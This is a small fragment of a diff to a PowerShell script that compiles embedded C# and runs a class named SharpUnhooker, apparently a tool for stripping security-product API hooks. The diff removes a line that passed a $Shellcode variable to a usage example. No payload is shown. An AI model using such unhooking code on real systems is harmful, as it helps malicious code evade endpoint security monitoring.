@@ -1325,4 +1325,3 @@ Add-Type -TypeDefinition $Source -Language CSharp
 
 # Now call it!
 [SharpUnhooker]::Main()
-[SUUsageExample]::UsageExample($Shellcode)
